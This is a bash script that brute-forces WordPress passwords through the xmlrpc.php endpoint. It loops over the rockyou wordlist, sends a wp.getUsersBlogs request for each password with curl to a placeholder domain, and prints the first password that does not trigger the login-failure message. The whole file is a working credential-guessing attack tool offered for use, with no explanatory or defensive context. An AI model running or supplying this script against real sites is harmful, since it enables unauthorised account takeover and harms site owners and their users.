#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Exit...\n"
    exit 1
}

function createXML(){
    password=$1

    xmlFile="""
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param>
      <value><string>username</string></value>
    </param>
    <param>
      <value><string>$password</string></value>
    </param>
    </params>
    </methodCall>
    """
    echo $xmlFile > file.xml

    response=$(curl -s -X POST "http://test.com/xmlrpc.php" -d@file.xml) #Edit domain

    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] password found: $password "
        exit 0
    fi
}

#Ctrl+C
trap ctrl_c SIGINT

cat /usr/share/wordlists/rockyou.txt | while read password; do
    createXML $password
done

